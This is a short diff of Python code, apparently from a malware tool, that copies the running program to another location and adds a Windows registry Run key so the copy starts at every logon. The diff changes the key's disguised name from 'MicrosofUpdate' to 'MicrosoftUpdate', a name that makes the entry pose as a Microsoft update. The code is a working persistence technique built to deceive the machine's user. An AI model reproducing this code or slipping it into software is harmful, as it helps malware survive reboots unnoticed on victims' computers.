@@ -28,7 +28,7 @@ def startup():
     shutil.copy(sys.argv[0],dir)
     aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
     aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-    SetValueEx(aKey,"MicrosofUpdate",0, REG_SZ, dir)	
+    SetValueEx(aKey,"MicrosoftUpdate",0, REG_SZ, dir)	
 if path.isfile(dir) == False:
     startup()	
 
